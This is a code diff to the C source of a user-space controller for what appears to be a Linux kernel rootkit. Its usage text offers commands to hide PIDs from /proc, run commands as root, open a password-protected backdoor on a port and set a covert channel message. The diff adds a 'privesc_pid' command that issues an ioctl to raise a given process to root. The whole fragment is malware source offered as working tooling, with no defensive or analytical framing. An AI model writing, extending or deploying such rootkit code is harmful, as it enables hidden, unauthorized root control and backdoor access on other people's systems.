@@ -15,6 +15,7 @@ static void usage(const char *prog)
     printf("  msg <text>                Set secondary comm channel message\n");
     printf("  hide_pid <pid>            Hide a PID from /proc\n");
     printf("  unhide_pid <pid>          Unhide a PID\n");
+    printf("  privesc_pid <pid>         Escalate PID to root\n");
     printf("  privesc_cmd <cmd>         Run command as root\n");
     printf("  backdoor <port>           Open backdoor on port\n");
     printf("  backdoor_pass <pass>      Set backdoor password\n");
@@ -79,6 +80,14 @@ int main(int argc, char *argv[])
             perror("ioctl UNHIDE_PID");
         else
             printf("PID %lu unhidden\n", args.target);
+
+    } else if (strcmp(argv[1], "privesc_pid") == 0 && argc >= 3) {
+        args.target = strtoul(argv[2], NULL, 10);
+        args.value = RK_PRIVESC_BY_PID;
+        if (ioctl(fd, RK_CMD_PRIVESC, &args) < 0)
+            perror("ioctl PRIVESC");
+        else
+            printf("PID %lu escalated to root\n", args.target);
 
     } else if (strcmp(argv[1], "privesc_cmd") == 0 && argc >= 3) {
         args.target = (unsigned long)argv[2];
